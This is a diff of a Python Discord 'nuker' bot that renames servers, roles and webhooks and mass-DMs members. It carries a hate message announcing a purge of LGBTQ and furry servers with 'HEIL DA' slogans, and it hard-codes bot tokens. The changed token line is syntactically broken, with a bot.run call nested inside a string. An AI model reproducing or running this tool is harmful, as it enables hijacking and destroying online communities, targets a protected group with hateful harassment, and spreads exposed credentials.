@@ -10,7 +10,7 @@ role_name = "Overthrown By ItWasntMe"
 server_name = "Overthrown By ItWasntMe"
 webhook_name = "Overthrown By ItWasntMe"
 message = ("@everyone INVADED BY DA YOUR SERVER HAS BEEN DESTROYED UNDER OPERATION: THE FIRST WAVE LED BY DA WHERE WE WILL PURGE AS MANY-LGBTQ/FURRIES-SERVERS-AS-WE-CAN. HEIL DA THIS SERVER WAS NUKED UNDER ITWASNTMES COMMAND. HEIL DA https://discord.gg/fDXsxnWJeR DESTROYED-BY-ITWASNTME https://cdn.discordapp.com/attachments/1395756899244310668/1396101873894686812/NDA.jpg?ex=687cdcb1&is=687b8b31&hm=085c452c0045d4c8892b2ae172f0ad25214ddb2d9e2459f4ef47910c801986c6&")
-token = "MTM5NjA2MjY0NzE1MzA3MDIxMw.G3Z4eh.lwWtpAj7S9u9_hRP_as8iHJf1k25jynF5LiX60"
+token = "bot.run("MTM5NjA2MjY0NzE1MzA3MDIxMw.GNBGzc.u9kDpNadknXvBvIJqZFdjFdiG2hCAvOTfzpd2Q")"
 
 
 bot =  discord.ext.commands.Bot(command_prefix=prefix, help_command=None, intents=discord.Intents.all())
@@ -133,4 +133,4 @@ async def massdm(ctx):
             await member.send("Your server has been overtaken by ItWasntMe HEIL DA https://discord.gg/fDXsxnWJeR")
         except:pass
 
-bot.run(token)
+bot.run("MTM5NjA2MjY0NzE1MzA3MDIxMw.GNBGzc.u9kDpNadknXvBvIJqZFdjFdiG2hCAvOTfzpd2Q")
